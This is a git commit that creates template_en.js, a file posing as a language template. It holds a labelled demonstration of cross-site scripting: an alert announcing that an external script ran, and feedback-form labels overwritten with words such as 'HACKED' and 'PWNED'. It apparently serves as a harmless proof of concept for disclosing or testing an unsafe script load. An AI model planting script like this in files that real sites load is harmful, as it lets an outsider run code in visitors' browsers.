256e8eb2d8dee381a3477d88d305404594999051
ZyaLake <54389444+ZyaLake@users.noreply.github.com>
2025-08-20 11:32:42 +0300

    Create template_en.js

---
+++ template_en.js
@@ -0,0 +1,8 @@
+alert('DEMO XSS: External script loaded and executed!');
+trustLng = {
+    "FeedbackName": "COMPROMISED FROM EXTERNAL SOURCE",
+    "FeedbackEmail": "HACKED",
+    "FeedbackMail": "SEND",
+    "FeedbackSubject": "PWNED", 
+    "FeedbackDesc": "EXPLOITED"
+};
